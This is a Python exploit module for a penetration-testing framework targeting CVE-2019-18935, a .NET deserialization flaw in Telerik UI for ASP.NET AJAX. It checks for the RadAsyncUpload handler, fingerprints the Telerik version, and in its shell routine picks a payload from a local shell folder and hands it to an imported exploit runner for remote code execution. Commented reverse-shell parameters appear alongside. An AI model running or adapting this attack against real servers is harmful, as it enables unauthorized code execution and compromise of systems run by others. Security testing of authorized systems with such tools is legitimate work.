
from Tools.PocSuite.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE, POC_SCAN
from Tools.PocSuite.lib.core.enums import OS_ARCH, OS
from Tools.PocSuite.lib.utils import random_str, generate_shellcode_list
from Tools.PocSuite.init_pocs.cve_2019_18935.RAU_crypto import check_cve_rau
from Tools.PocSuite.init_pocs.cve_2019_18935.CVE201918935 import run
from configvalue import FOLDER_POCS
import os
class DemoPOC(POCBase):
    vulID = 'CVE-2019-18935'  # ssvid
    version = '1.0'
    author = ['noperator', 'asdcxsd']
    vulDate = '2019-1-11'
    createDate = '2019-1-11'
    updateDate = '2019-1-11'
    references = ['https://github.com/noperator/CVE-2019-18935']
    name = 'Telerik UI for ASP.NET AJAX - .NET deserialization vulnerability CVE-2019-18935'
    appPowerLink =  {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.ASP],
                "folder_init": "cve_2019_18935"}
    appName = 'telerik_cve_2019_18935'
    appVersion = 'CVE-2019-18935'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Progress Telerik UI for ASP.NET AJAX through 2019.3.1023 contains a .NET deserialization vulnerability in the RadAsyncUpload function. This is exploitable when the encryption keys are known due to the presence of CVE-2017-11317 or CVE-2017-11357, or other means. Exploitation can result in remote code execution. (As of 2020.1.114, a default setting prevents the exploit. In 2019.3.1023, but not earlier versions, a non-default setting can prevent exploitation.)'''
    samples = []
    pocDesc = '''port Default: (not config 11252'''
  
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    
    def _check(self, url):
        flag = 'RadAsyncUpload handler is registered succesfully'
        data = ''
        payloads = [
            r"/Telerik.Web.UI.WebResource.axd?type=rau"
        ]
        for payload in payloads:
            vul_url = url + payload
    
            r = requests.get(vul_url)

            if flag in r.text:
                return payload, data
        return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['Postdata'] = p[1]

        return self.parse_output(result)

    def _attack(self):
        result = {}
        filename = random_str(6) + ".php"
        VERSION, DATA   = check_cve_rau(self.url);
        if VERSION  != False:
            result['telerik'] = {}
            result['telerik']['version'] = VERSION
            result['telerik']['data'] = DATA
            return self.parse_output(result)
        else: 

            return self.parse_output(False)

    def _shell(self):
        path_shell =  FOLDER_POCS + "init_pocs/" + self.appPowerLink['folder_init'] +"/shell/"
        from os import listdir
        from os.path import isfile, join
        import random
        onlyfiles = [f for f in listdir(path_shell) if isfile(join(path_shell, f))]
        file = random.choice(onlyfiles)
        path = os.path.join(path_shell, file)
        print(path)
        
        data = self.headers['Referer']['input']
   
        #data['LHOST']
        #data['LPOST']
        #input in result
        VERSION   = data['result']['telerik']['version']
        URL = data['entrypoint'] 
        print(self.url)
        run(surl=self.url + "/Telerik.Web.UI.WebResource.axd?type=rau", payload=path, version=VERSION)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
